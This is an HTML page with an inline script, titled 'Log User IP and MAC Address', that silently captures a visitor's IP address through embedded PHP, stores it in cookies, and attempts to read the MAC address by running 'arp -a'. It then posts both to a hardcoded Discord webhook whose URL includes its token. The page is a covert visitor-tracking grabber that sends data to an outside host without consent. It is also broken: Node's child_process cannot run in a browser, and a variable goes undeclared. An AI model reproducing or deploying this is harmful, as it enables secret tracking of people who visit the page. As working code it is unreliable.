<!DOCTYPE html>
<html>
  <head>
    <title>Log User IP and MAC Address</title>
  </head>
  <body>
    <script>
      // Get the user's IP address
      const ipAddress =
        "<?php if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) echo $_SERVER['HTTP_X_FORWARDED_FOR']; else echo $_SERVER['REMOTE_ADDR']; ?>";

      // Set the IP address cookie
      document.cookie = `ip_address=${ipAddress}; path=/`;

      // Get the user's MAC address
      try {
        const { execSync } = require("child_process");

        // Execute the `arp` command and parse the output to get the MAC address
        const arpOutput = execSync("arp -a").toString();
        const lines = arpOutput.split("\n");

        for (const line of lines) {
          if (line.includes(ipAddress)) {
            const macAddress = line.split(" ")[3].trim();

            // Set the MAC address cookie
            document.cookie = `mac_address=${macAddress}; path=/`;

            // Log the IP and MAC addresses
            console.log(`IP Address: ${ipAddress}`);
            console.log(`MAC Address: ${macAddress}`);

            // Send the IP and MAC addresses to the Discord webhook
            sendToDiscordWebhook(ipAddress, macAddress);

            break;
          }
        }
      } catch (error) {
        console.error(error);
        macAddress = "Unknown";
      }

      // Function to send the IP and MAC addresses to the Discord webhook
      async function sendToDiscordWebhook(ipAddress, macAddress) {
        // Replace with your own Discord webhook URL
        const webhookUrl = "https://discord.com/api/webhooks/1220786784426922025/OXXd7xO_wT8mc48DTBIJ2tDY45OyH8X5pPllvaR8RY65SJlpp8lRlj45QHO1j9OjfnL-";

        try {
          const response = await fetch(webhookUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              ip_address: ipAddress,
              mac_address: macAddress,
            }),
          });

          if (!response.ok) {
            throw new Error("Error sending message to Discord webhook");
          }

          console.log("Message sent to Discord webhook");
        } catch (error) {
          console.error(error);
        }
      }
    </script>
  </body>
</html>
